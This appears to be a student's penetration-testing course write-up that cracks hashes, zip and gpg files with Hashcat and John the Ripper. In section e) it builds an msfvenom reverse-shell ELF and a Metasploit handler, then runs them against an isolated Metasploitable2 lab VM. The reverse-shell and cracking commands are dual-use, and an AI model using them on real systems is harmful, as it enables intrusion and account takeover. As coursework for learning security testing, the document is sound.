+++
title = "H5 - Password cracking with Hashcat & John"
date = "2025-10-01"
categories = ["pentesting-course"]
+++

# H5

---

### a) Installing and testing Hashcat

So firstly I will install all the required programs and test it's functionality on the following hash: *6b1628b016dff46e6fa35684be6acc96*

It seems like hashcat is already installed on my system: 

![Hashcat --help](img/h5/hashcat_help.png)

To test out the program, I'll be following Tero's short guide at: [Cracking passwords with hashcat](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/). So firstly I'm tasked to install ```hashid hashcat wget``` so let's see if I have all of those installed. 

![Installed programs](img/h5/guide_programs.png)

It seems everything is good to go!

Next I create a new directory for testing purposes ```mkdir hashed``` and go into the new directory ```cd hashed```. After which I'll be making my life a bit easier by putting the hash into a text file ```echo "6b1628b016dff46e6fa35684be6acc96" > hash.txt```

Now I'm going to be using the rockyou wordlist which I get by ```wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz```. 
After the file gets on my machine, I use ```aunpack rockyou.txt.tar.gz``` 
but you can also use ```tar xf rockyou.txt.tar.gz``` to unpack the file.

![Rockyou.txt](img/h5/aunpack.png)

Now, I need to identify the hash type. I could go by eyeing through some example hashes, but there are fortunately tools to make this a bit easier. This time I'll be using hashid. 
By doing ```hashid -m hash.txt``` I get the following:

![Hashid output](img/h5/hash_types.png)

MD5 is quite common compared to the other two so that's what I'll be trying out first. Hashid gave me the hashcat mode which in this case is 0, I can start cracking by 
```hashcat -m 0 hash.txt rockyou.txt -o cracked```

I get the cracked hash in the specified output file 'cracked' and with ```cat cracked``` I get the cracked hash:

![Cracked hash](img/h5/cracked.png)


[(Tero Karvinen 2022.)](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.)

--- 

### b) Installing and testing John the Ripper

Like the previous section, I'll be going through a guide Tero has made called: [Crack File Password With John](https://terokarvinen.com/2023/crack-file-password-with-john/).

Firstly I'll install the prerequisites I need with the following:
`sudo apt install build-essential libssl-dev zlib1g zlib1g-dev zlib1g-gst libbz2-1.0 libbz2-dev zip`. I can't seem to find the zlib1g-gst package, so I ```sudo apt search zlib1g``` and don't seem to find the package there either. So I go check out the [john installation readme](https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU) and install the following: 
`sudo apt install build-essential libssl-dev zlib1g-dev zip libbz2-dev`.

This time the installation completed successfully.

Now I need to clone the john repository and build it. So firstly I clone the repo: `git clone https://github.com/openwall/john.git`. Next I navigate to the *john/src/* directory and run `./configure`. I check the missing libraries list and I got everything I need installed. After which I run `make -s clean && make -sj4` to start compiling.

I navigate to the john/run/ directory and run `./john` and everything seems to be in order:

![John the ripper](img/h5/john.png)

Next I need a file to crack open, luckily Tero has a password protected zip for this purpose. To get the file I do `wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip`. I'll try to unpack the zip file and it indeed seems to be password protected. Tero wasn't lying.

![Tero.zip](img/h5/tero_zip.png)

So now to crack the file I need to first extract the hash from the zip file. To do so I use zip2john: 
`~/john/run/zip2john tero.zip > tero.zip.hash`. 

After which I `cat` the output file and get the following:

![Tero hash](img/h5/tero_hash.png)

Lastly I let john go at the hash and see if we get anything open:
`~/john/run/john tero.zip.hash` and it seems we got the password.

![Tero password](img/h5/tero_pass.png)

After unpacking the files and using the password *butterfly* I get the secretFiles directory with a file SECRET.md with the following contents:

![SECRET.md](img/h5/flag.png)


[(Tero Karvinen 2023.)](https://terokarvinen.com/2023/crack-file-password-with-john/)

---

### c) Making a password protected file and cracking it

I begin with creating a directory for the task `mkdir c` and navigate inside it. Then I create a another directory called *secret* and inside it I create a text file. I pack the files using `tar -cf secret.tar secret` and now due to tar not providing me with any type of encryption I googled what I could be using for this task.

I came across an article by [Justin Chapin](https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg), in which they use gpg to encrypt a tar file... Convenient! So now I encrypt the files with `gpg -c secret.tar`. [(Justin Chapin 2025.)](https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg).

Now that we have our target file. Let's crack it open by using john once more. If I try to decrypt the file I get a prompt asking for the password.

![gpg secret](img/h5/gpg_pass.png)

So lets start with running: 
`~/john/run/gpg2john secret.tar.gpg > secret.hash`.

I `cat` the output file and see the hash:

![gpg hash](img/h5/gpg_hash.png)

Lastly lets use john to crack the hash:
`~/john/run/john --wordlist=wordlist.txt secret.hash`

![gpg crack](img/h5/gpg_cracked.png)

And now if I use `~/john/run/john --show secret.hash` I see the password:

![Password](img/h5/benstiller.png)

And inside the newly extracted directory I find benstiller.txt:

![Dark secret](img/h5/darksecret.png)

No wonder this was behind a password. Someone might steal such an amazing movie idea and make MILLIONS!!!

---

### d) Making a hash for a text file and cracking it

Lets make the target file. I'll use SHA-1 for the file `echo -n "your secret" | sha1sum > secret`. Then I ran `hashid secret` and it failed to recognize the hash. I quickly realized I had an extra dash at the end so I quickly removed it from the file and it worked:

![Sha1](img/h5/sha1.png)

Using `hashid -m secret` I get the hashcat mode for SHA-1 which is 100.
Lastly I run `hashcat -m 100 secret rockyou.txt -o cracked` and we get what we came for:

![Shaben](img/h5/shaben.png)

---

### e) Using msfvenom to create a reverse shell to a target machine.

For this task I'll be using the following setup:

Target: Metasploitable2 virtual machine / 10.10.10.11

Host: Kali virtual machine / 10.10.10.10

I double check my virtual machines can't connect to internet. They are using a bridge that has no actual interfaces to use so they can only communicate with each other. On my the kali machine I open port 4444/tcp temporarily to use for testing by `ufw allow 4444/tcp`.

After the setup I start with msfvenom. I found good examples from [OffSec](https://www.offsec.com/metasploit-unleashed/msfvenom/) and made modifications to fit my needs.

`-a x86` to specify the target architecture.
`--platform linux` to specify the target platform.
`-p linux/x86/reverse_shell_tcp` to specify the payload.
`LHOST=10.10.10.10` and `LPORT=4444` to connect to our host.
`-e generic/none` skips encoding.
`-f elf` to format the output as .elf. I tried other formats like python and bash but couldn't get them to run properly.
`> reverse_shell.elf` lastly saves the output to a file.

`msfvenom -a x86 --platform linux -p linux/x86/reverse_shell_tcp LHOST=10.10.10.10 LPORT=4444 -e generic/none -f elf > reverse_shell.elf`

Then I use `msfconsole` to start a listening session `use exploit/multi/handler`. Then I set all the needed info `set LHOST 10.10.10.10`, `set LPORT 4444` and `set payload linux/x86/shell_reverse_tcp`.
I start the session with `exploit`.

After which I use ftp to login to the target and transfer the file:
`ftp msfadmin@10.10.10.11` and `put reverse_shell.elf`

On the target machine, I make the file executable `chmod a+x reverse_shell.elf`. Then I run the file `./reverse_shell.elf`

After which we get a connection on our host machine:

![Reverse shell](img/h5/msfvenom.png)

Lastly I close the opened 4444 `sudo ufw deny 4444/tcp`.

[(OffSec.)](https://www.offsec.com/metasploit-unleashed/msfvenom/)

---

### x) Additional reading

#### Cracking passwords with hashcat

- Very straight forward and quickly gives all the necessary info on using hashcat.

- Possible addition could be instead of using a premade hash, it could instruct the user to create a md5 hash from a common password (benstiller for example). And then go on as it is currently, after which the user could be asked to check out other formats like SHA etc.

[(Tero Karvinen 2022.)](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/.)
#### Crack file passwords with john

- In this section we do have a call to action at the end where we are encouraged to create and crack some files.

- Feels like an improvement over the hashcat guide.

[(Tero Karvinen 2023.)](https://terokarvinen.com/2023/crack-file-password-with-john/)

### Sources

All the assignments this page is based on can be found at [Tero Karvinen](https://terokarvinen.com/tunkeutumistestaus/)

[Tero Karvinen 2022. Cracking passwords with hashcat.](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/)

[Tero Karvinen 2023. Crack file password with john.](https://terokarvinen.com/2023/crack-file-password-with-john/)

[John the ripper github 2022. INSTALL-UBUNTU](https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU)

[Justin Chapin 2025. How to create compressed encrypted archives with tar and gpg.](https://linuxconfig.org/how-to-create-compressed-encrypted-archives-with-tar-and-gpg)

[OffSec. MSFvenom.](https://www.offsec.com/metasploit-unleashed/msfvenom/)
